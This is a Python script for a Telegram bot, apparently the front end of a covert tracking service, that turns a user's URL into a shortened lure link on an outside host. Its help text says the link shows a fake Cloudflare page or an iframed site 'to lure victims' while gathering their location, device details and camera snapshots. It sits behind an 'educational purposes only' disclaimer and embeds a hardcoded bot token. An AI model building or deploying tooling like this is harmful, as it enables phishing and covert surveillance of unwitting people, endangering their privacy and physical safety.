import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import urllib.parse
import urllib.request
import base64

TOKEN = '8840717306:AAEOhGfFnZsSWGtdOChaJaGC4JLfReeKBaU'

CHANNEL_USERNAME = '@DARKHACKER1230'

CUSTOM_MESSAGE = """WELCOME 黑暗黑客 !
YOU CAN USE THIS BOT 🤖 TO TRACK PEOPLE JUST THROUGH A SIMPLE LINK 🔗.
IT CAN GATHER INFORMATIONS LIKE LOCATION 📍, DEVICE INFO 📱, CAMERA SNAPS 📷.

JOIN OUR CHANNELS TO USE THIS BOT 🤖. AFTER JOINING CHANNELS CLICK ON JOINED BUTTON TO CONTINUE."""

TERMS_MESSAGE = """✅TERMS AND CONDITIONS✅
1.THE DARK HACKER 1230 BOT IS INTENDED FOR EDUCATIONAL PURPOSES ONLY AND SHOULD NOT BE USED FOR ANY UNETHICAL OR ILLEGAL ACTIVITIES.

2. USERS OF THE DARK HACKER 1230 BOT ARE SOLELY RESPONSIBLE FOR THEIR OWN ACTIONS AND DECISIONS BASED ON THE INFORMATION PROVIDED.

3. IF YOU USE THE DARK HACKER 1230 BOT FOR ANY ILLEGAL OR UNETHICAL ACTIVITIES, YOU DO SO AT YOUR OWN RISK AND WILL BE SOLELY RESPONSIBLE FOR ANY LEGAL OR OTHER CONSEQUENCES THAT MAY ARISE.

IF YOU ARE AGREE WITH OUR TERMS , CLICK ON BUTTON BELOW.
👇👇👇👇👇👇"""

SUCCESS_MESSAGE = """THANK YOU 🙏 FOR ACCEPTING OUR TERMS AND CONDITIONS.
TO CREATE A NEW LINK,
CLICK THE "CREATE LINK" BUTTON BELOW.
👇👇👇👇👇👇"""

bot = telebot.TeleBot(TOKEN)

user_state = {}

def shorten_url(long_url):
    try:
        api_url = f"https://da.gd/shorten?url={urllib.parse.quote(long_url)}"
        req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            short_url = response.read().decode('utf-8').strip()
            return short_url
    except Exception as e:
        return long_url

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        ask_to_join(message.chat.id)
    except:
        ask_to_join(message.chat.id)

def ask_to_join(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("JOIN CHANNEL ↗", url=f"https://t.me/{CHANNEL_USERNAME.replace('@','')}"))
    markup.add(InlineKeyboardButton("JOINED", callback_data="check_join"))
    
    bot.send_message(chat_id, CUSTOM_MESSAGE, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_query(call):
    user_id = call.from_user.id
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            bot.answer_callback_query(call.id, "Successfully joined!")
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("ACCEPT TERMS AND CONDITIONS", callback_data="accept_terms"))
            
            bot.send_message(call.message.chat.id, TERMS_MESSAGE, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "You have not joined the channel yet!", show_alert=True)
    except:
        bot.answer_callback_query(call.id, "Please join the channel first!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "accept_terms")
def accept_terms_query(call):
    bot.answer_callback_query(call.id, "Terms Accepted Successfully!")
    send_create_link_menu(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "create_new_link")
def create_new_link_query(call):
    bot.answer_callback_query(call.id, "Please send your URL")
    bot.send_message(call.message.chat.id, "🌐 Enter Your URL")
    user_state[call.from_user.id] = "waiting_for_link"

def send_create_link_menu(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("CREATE LINK 🔗", callback_data="create_new_link"))
    bot.send_message(chat_id, SUCCESS_MESSAGE, reply_markup=markup)

@bot.message_handler(func=lambda message: user_state.get(message.from_user.id) == "waiting_for_link")
def handle_user_link(message):
    user_link = message.text.strip()
    user_state[message.from_user.id] = None
    
    try:
        encoded_bytes = base64.b64encode(user_link.encode('utf-8'))
        encoded_str = encoded_bytes.decode('utf-8')
        
        tracking_url = f"https://online-notes-hub.onrender.com/c/3r9ruun/{encoded_str}"
        
        short_link = shorten_url(tracking_url)
        
        response_text = f"""NEW LINKS HAVE BEEN CREATED SUCCESSFULLY. YOU CAN USE ANY ONE OF THE BELOW LINKS.
URL: {user_link}

✅ YOUR LINKS

🌐 CLOUDFλαRE PAGE LINK
{short_link} (BEST)

🌐 WEBVIEW PAGE LINK
{short_link}

DEV - DarkHacker 🕷"""

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Create new Link", callback_data="create_new_link"))
        
        bot.send_message(message.chat.id, response_text, reply_markup=markup)
        
    except Exception as e:
        bot.send_message(message.chat.id, "Invalid URL format! Please try again by sending a correct link.")
        user_state[message.from_user.id] = "waiting_for_link"
@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = """THROUGH THIS BOT 🤖 YOU CAN TRACK PEOPLE JUST BY SENDING A SIMPLE LINK 🔗.

SEND /create TO BEGIN , AFTERWARDS IT WILL ASK YOU FOR A URL WHICH WILL BE USED IN IFRAME TO LURE VICTIMS. AFTER RECEIVING THE URL IT WILL SEND YOU 2 LINKS WHICH YOU CAN USE TO TRACK PEOPLE.

𝑆𝑃𝐸𝐶𝐼𝐹𝐼𝐶𝐴𝑇𝐼𝑂𝑁𝑆.
1. CLOUDFLARE LINK: THIS METHOD WILL SHOW A CLOUDFLARE UNDER ATTACK PAGE TO GATHER INFORMATIONS AND AFTERWARDS VICTIM WILL BE REDIRECTED TO DESTINATIONED URL.
2. WEBVIEW LINK: THIS WILL SHOW A WEBSITE (ex bing , DATING SITES ETC) USING IFRAME FOR GATHERING INFORMATION.( ⚠️ MANY SITES MAY NOT WORK UNDER THIS METHOD IF THEY HAVE X-FRAME HEADER PRESENT.ex HTTPS://google.com )

OWNER - @darkhacker1230"""
    
    bot.reply_to(message, help_text)
@bot.message_handler(commands=['create'])
def create_link(message):
    user_state[message.from_user.id] = "waiting_for_link"
    bot.reply_to(message, "🔗 Please send the URL you want to use for tracking:")
bot.infinity_polling()